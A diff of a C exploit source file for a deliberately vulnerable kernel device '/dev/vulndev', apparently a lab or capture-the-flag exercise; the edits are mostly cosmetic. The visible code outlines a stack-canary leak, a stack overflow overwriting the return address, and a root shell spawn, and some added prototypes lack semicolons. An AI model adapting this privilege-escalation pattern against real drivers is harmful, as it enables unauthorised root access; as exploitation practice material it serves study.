@@ -1,4 +1,3 @@
-#include "include/xpl_utils.h"
 #define _GNU_SOURCE
 #include <stdio.h>
 #include <stdlib.h>
@@ -8,15 +7,21 @@
 #include <errno.h>
 #include "xpl_utils.h"
 
-/* Configurations */
+/* Configuration */
 #define DEVICE_PATH     "/dev/vulndev"
 
-/* IOCTLs */
+/* IOCTL Codes */
 #define VULN_IOCTL_READ  _IOR(0x1337, 1, char *)
 #define VULN_IOCTL_WRITE _IOW(0x1337, 2, char *)
 #define VULN_IOCTL_EXEC  _IO(0x1337, 3)
 
-int main()
+int			open_dev(const char *path, int flags);
+uintptr_t	leak_cookie(int fd, size_t leak_slots, size_t cookie_offset)
+void		stack_overflow(int fd, uintptr_t cookie, uintptr_t ret_addr,
+                    		size_t cookie_offset, size_t pl_len)
+void		spawn_shell(void);
+
+int main(void)
 {
     int fd = open_dev(DEVICE_PATH, O_RDWR);
 
@@ -95,7 +100,7 @@ void stack_overflow(int fd, uintptr_t cookie, uintptr_t ret_addr,
 }
 
 /* Rooted */
-void spawn_shell() {
+void spawn_shell(void) {
     if (getuid() == 0) {
         printf("[+] GOT ROOT SHELL!\n");
         system("/bin/sh");
